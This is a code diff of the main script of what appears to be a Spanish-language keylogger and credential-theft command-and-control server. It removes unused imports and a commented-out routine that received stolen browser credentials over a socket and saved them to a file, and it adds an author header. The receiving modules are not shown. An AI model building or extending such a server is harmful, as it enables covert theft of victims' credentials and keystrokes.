@@ -1,16 +1,17 @@
-import os
-import socket
 import threading
 from pathlib import Path
 import cmd_cntr
 import recv_cred
-import ssl
 import colorama
 from colorama import Fore
-import certs
-import tempfile
 import recv_keys
-# from ETHICAL_HACKING.cryptography.CryptoPhenix import encrypt, decrypt
+
+#
+# Autor   ->  an0mal1a
+# Name    ->  Pablo
+# GitHub  ->  https://github.com/an0mal1a
+# Correo  -> pablodiez024@proton.me
+#
 
 # Conexion de keylog
 # C&C
@@ -25,23 +26,6 @@ def banner():
 
 def get_user_path():
     return "{}/".format(Path.home())
-
-
-"""def recv_out(secure_conn):
-
-    while True:
-        output = secure_conn.recv(4096)
-        return output
-
-
-def get_credentials(secure_conn_1):
-    location = get_user_path() + "Desktop/"
-    filename = "Credentials.txt"
-
-    # Recibimos las credenciales del navegador
-    while True:
-        cred = secure_conn_1.recv(4096)
-        write_file(cred.decode(), location, filename)"""
 
 
 def main():
@@ -63,13 +47,6 @@ def main():
     thread_2.join()
     thread_1.join()
     thread_3.join()
-
-
-def write_file(text, location, filename):
-
-    # Archivo a crear
-    with open(location + filename, "a", encoding="utf-8") as log:
-        log.write(text)
 
 
 if __name__ == "__main__":
